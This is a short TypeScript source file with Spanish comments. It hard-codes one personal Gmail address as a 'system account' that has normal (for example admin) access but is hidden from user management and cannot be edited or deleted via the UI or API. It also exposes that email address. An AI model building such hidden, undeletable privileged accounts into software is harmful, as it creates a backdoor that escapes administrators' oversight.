/**
 * Cuentas de sistema: tienen acceso normal (p. ej. admin)
 * pero no aparecen en la gestión de usuarios ni se pueden
 * editar/eliminar desde la UI/API.
 */
const HIDDEN_USER_EMAILS = new Set(['andrescaleraa@gmail.com']);

export function isHiddenUserEmail(email: string | null | undefined): boolean {
  if (!email) return false;
  return HIDDEN_USER_EMAILS.has(email.trim().toLowerCase());
}
